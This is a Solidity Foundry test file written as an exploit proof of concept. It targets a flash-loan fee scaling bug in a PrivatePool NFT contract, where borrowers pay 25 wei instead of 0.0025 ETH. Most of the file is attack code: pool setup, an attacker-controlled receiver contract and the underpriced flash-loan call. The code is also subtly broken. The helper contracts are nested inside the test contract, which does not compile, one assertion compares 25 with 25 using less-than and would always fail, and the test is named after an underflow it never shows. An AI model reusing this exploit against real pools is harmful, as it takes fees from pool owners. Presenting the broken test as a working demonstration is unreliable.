// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*
Exploit PoC for PrivatePool flash loan fee under-scaling bug.

The pool’s changeFee is expressed with 4 decimals of precision (e.g. 25 → 0.0025 ETH),
yet flashFee() returns the raw un-scaled value.  
Borrowers therefore pay just 25 wei instead of 0.0025 ETH per flash-loan.

This test demonstrates that:
1. changeFeeQuote() asks for 0.0025 ETH per NFT in a “change” operation.
2. flashFee() asks only 25 wei for the exact same NFT.
3. An attacker can successfully flash-loan an NFT by paying 25 wei instead of
   the intended 0.0025 ETH.
*/

import "forge-std/Test.sol";
import "src/PrivatePool.sol";

import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC721TokenReceiver.sol";

contract ExploitTest is Test {
    // Test actors
    address owner   = address(0xBEEF);
    address attacker = address(0x1337);

    // Contracts
    MockFactory factory;
    MockNFT nft;
    PrivatePool pool;
    AttackReceiver receiver;

    // Constants
    uint56 constant CHANGE_FEE        = 25;   // 0.0025 ETH for change ops
    uint16 constant FEE_RATE_BP       = 200;  // 2 % trading fee
    uint128 constant VIRTUAL_BASE_RES = 10 ether;
    uint128 constant VIRTUAL_NFT_RES  = 1e18;

    function setUp() public {
        vm.startPrank(owner);

        // Deploy supporting contracts
        factory = new MockFactory();
        nft     = new MockNFT();

        // Deploy pool implementation
        pool = new PrivatePool(
            address(factory),
            address(0),        // royalty registry not used in this test
            address(0)         // stolen-NFT oracle not used
        );

        // Initialize pool (base token = ETH)
        pool.initialize(
            address(0),        // base token (ETH)
            address(nft),
            VIRTUAL_BASE_RES,
            VIRTUAL_NFT_RES,
            CHANGE_FEE,
            FEE_RATE_BP,
            bytes32(0),        // no Merkle root (all weights = 1e18)
            false,             // use stolen oracle
            false              // pay royalties
        );

        // Mint one NFT to owner and deposit it to the pool
        uint256 tokenId = nft.mint(owner);
        nft.safeTransferFrom(owner, address(pool), tokenId);

        vm.stopPrank();

        // Prepare attacker receiver contract
        vm.startPrank(attacker);
        receiver = new AttackReceiver(address(pool));
        vm.stopPrank();
    }

    /*-----------------------------------------------------------
                                Tests
    -----------------------------------------------------------*/

    function testExploitFlashLoanFeeUnderflow() public {
        uint256 tokenId = 1; // only NFT inside the pool

        // Correct fee as used in "change" operation (should be 0.0025 ETH)
        (uint256 scaledChangeFee,) = pool.changeFeeQuote(1e18);
        assertEq(
            scaledChangeFee,
            uint256(CHANGE_FEE) * 1e14, // 25 * 10^14 = 0.0025 ETH
            "Scaled changeFee should equal 0.0025 ETH"
        );

        // Flash-loan fee returned by pool (BUG: only 25 wei)
        uint256 flashFee = pool.flashFee(address(nft), tokenId);
        assertEq(flashFee, uint256(CHANGE_FEE), "Flash fee should equal raw changeFee (25 wei)");

        // Ensure flash fee is four orders of magnitude smaller than intended
        assertLt(flashFee, scaledChangeFee / 1e14, "Flash fee grossly under-priced");

        // Record attacker balance before
        uint256 balBefore = attacker.balance;

        // Execute flash loan paying the dramatically reduced fee
        vm.prank(attacker);
        bool success = pool.flashLoan{value: flashFee}(
            IERC3156FlashBorrower(address(receiver)),
            address(nft),
            tokenId,
            ""
        );
        assertTrue(success, "Flash loan should succeed");

        // Attacker only spent 25 wei
        uint256 balAfter = attacker.balance;
        assertEq(balBefore - balAfter, flashFee, "Attacker paid only 25 wei");

        // Sanity: pool still owns the NFT after loan is returned
        assertEq(nft.ownerOf(tokenId), address(pool), "NFT should be back in the pool");
    }

    /*-----------------------------------------------------------
                            Helper contracts
    -----------------------------------------------------------*/

    // Minimal factory stub satisfying the interface surface
    contract MockFactory {
        uint16 public constant protocolFeeRate = 0; // 0% protocol fee
        mapping(uint256 => address) public ownerOf;

        receive() external payable {}
    }

    // Simple ERC-721 used for testing
    contract MockNFT is ERC721("Mock NFT", "MNFT") {
        uint256 private _nextId = 1;

        function tokenURI(uint256) public pure override returns (string memory) {
            return "";
        }

        function mint(address to) external returns (uint256 id) {
            id = _nextId++;
            _safeMint(to, id);
        }
    }

    // Flash-loan receiver controlled by the attacker
    contract AttackReceiver is IERC3156FlashBorrower, ERC721TokenReceiver {
        address public immutable pool;
        address public immutable controller;

        constructor(address _pool) {
            pool = _pool;
            controller = msg.sender;
        }

        /* IERC3156FlashBorrower ------------------------------------------------*/

        function onFlashLoan(
            address initiator,
            address,            // token
            uint256,            // tokenId
            uint256,            // fee (25 wei)
            bytes calldata      // data
        ) external override returns (bytes32) {
            require(msg.sender == pool, "Not called by pool");       // caller must be pool
            require(initiator == controller, "Initiator mismatch");  // initiator must be attacker
            // Do nothing – exploit only demonstrates fee mis-calculation
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }

        /* ERC721TokenReceiver --------------------------------------------------*/

        function onERC721Received(
            address,
            address,
            uint256,
            bytes calldata
        ) external pure override returns (bytes4) {
            return this.onERC721Received.selector;
        }
    }
}